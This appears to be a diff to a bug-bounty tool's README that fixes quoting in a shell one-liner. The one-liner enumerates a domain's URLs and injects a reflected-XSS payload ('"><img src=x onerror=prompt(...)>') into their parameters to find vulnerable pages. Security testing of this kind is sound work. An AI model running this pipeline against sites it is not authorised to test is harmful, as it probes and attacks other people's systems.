@@ -83,7 +83,7 @@ $ ./awesome-bugbounty-builder.sh
 ```sh
 $ amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt
 $ cat domain.txt | gauplus -random-agent -t 200 | gf xss | kxss | tee domain2.txt
-$ cat domain.txt | gauplus -random-agent -t 200 | gf xss | uro | qsreplace '"><img src=x onerror=prompt('jin');> | freq
+$ cat domain.txt | gauplus -random-agent -t 200 | gf xss | uro | qsreplace '"><img src=x onerror=prompt('jin');>' | freq
 ```
 
 ---
